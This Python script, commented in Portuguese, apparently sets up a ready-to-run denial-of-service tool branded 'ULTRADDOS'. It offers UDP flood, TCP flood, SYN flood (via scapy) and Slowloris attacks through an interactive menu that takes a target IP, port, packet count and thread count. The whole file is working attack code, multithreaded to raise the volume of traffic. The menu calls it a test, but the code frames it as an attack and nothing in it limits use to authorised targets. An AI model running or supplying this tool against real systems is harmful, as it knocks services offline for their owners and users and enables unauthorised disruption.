import socket
import threading
import time
import warnings
from scapy.all import IP, TCP, send
from scapy.config import conf
from cryptography.utils import CryptographyDeprecationWarning

# Suprimir aviso de depreciação do TripleDES
warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)

# Caminho para o arquivo manuf (se tiver baixado manualmente)
conf.manufdb = "C:/Users/Angelo/scapy-manuf/manuf"  # Altere esse caminho se necessário

# Logo
logo = """
 █    ██  ██▓  ▄▄▄█████▓ ██▀███   ▄▄▄      ▓█████▄ ▓█████▄  ▒█████    ██████ 
 ██  ▓██▒▓██▒  ▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄    ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
▓██  ▒██░▒██░  ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄  ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
▓▓█  ░██░▒██░  ░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██ ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
▒▒█████▓ ░██████▒▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
░░▒░ ░ ░ ░ ░ ▒  ░  ░      ░▒ ░ ▒░  ▒   ▒▒ ░ ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
 ░░░ ░ ░   ░ ░   ░        ░░   ░   ░   ▒    ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
   ░         ░  ░          ░           ░  ░   ░       ░        ░ ░        ░  
                                            ░       ░                        
"""

# Métodos de ataque
def udp_flood(target_ip, target_port, num_packets):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = b"A" * 1024
    for _ in range(num_packets):
        sock.sendto(packet, (target_ip, target_port))

def tcp_flood(target_ip, target_port, num_packets):
    packet = b"A" * 1024
    for _ in range(num_packets):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.send(packet)
            sock.close()
        except:
            continue

def syn_flood(target_ip, target_port, num_packets):
    for _ in range(num_packets):
        ip = IP(dst=target_ip)
        tcp = TCP(dport=target_port, flags="S")
        send(ip/tcp, verbose=False)

def slowloris(target_ip, target_port, num_connections):
    sockets = []
    print("[*] Iniciando Slowloris...")
    try:
        for _ in range(num_connections):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            s.send(b"GET / HTTP/1.1\r\n")
            s.send(f"Host: {target_ip}\r\n".encode())
            sockets.append(s)
    except socket.error:
        pass

    tempo_final = time.time() + 60  # Executa por 60 segundos
    while time.time() < tempo_final:
        print(f"[+] Mantendo {len(sockets)} conexões vivas...")
        for s in list(sockets):
            try:
                s.send(b"X-a: b\r\n")
                time.sleep(1)
            except socket.error:
                sockets.remove(s)

# Execução por threads
def run_attack(method, ip, port, count, threads):
    method_map = {
        '1': udp_flood,
        '2': tcp_flood,
        '3': syn_flood,
        '4': slowloris
    }

    target_func = method_map.get(method)
    if not target_func:
        print("Método inválido.")
        return

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=target_func, args=(ip, port, count))
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

# Interface principal
def main():
    print(logo)
    print("Escolha o método de teste:")
    print("1. UDP Flood")
    print("2. TCP Flood")
    print("3. SYN Flood")
    print("4. Slowloris")

    method = input("Método (1-4): ").strip()
    ip = input("IP do alvo: ").strip()
    port = int(input("Porta: ").strip())
    count = int(input("Pacotes/conexões por thread: ").strip())
    threads = int(input("Número de threads: ").strip())

    print(f"\n[*] Iniciando ataque no {ip}:{port} com {threads} threads...\n")
    run_attack(method, ip, port, count, threads)

# Execução segura com Ctrl+C
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Ataque interrompido pelo usuário.")
